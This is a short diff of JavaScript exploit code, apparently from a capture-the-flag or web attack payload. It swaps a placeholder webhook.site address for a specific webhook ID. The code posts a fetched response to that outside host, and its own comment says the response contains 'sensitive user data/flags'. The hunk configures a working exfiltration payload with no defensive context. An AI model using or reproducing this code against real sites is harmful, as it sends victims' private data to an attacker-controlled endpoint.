@@ -20,7 +20,7 @@
     .then(res => res.json())
     .then(data => {
         // Exfiltrates the response (containing sensitive user data/flags)
-        fetch("https://webhook.site/your-unique-id", {
+        fetch("https://webhook.site/2e9e974e-402d-4847-843e-01c3db536482", {
             method: "POST",
             body: JSON.stringify(data)
         });
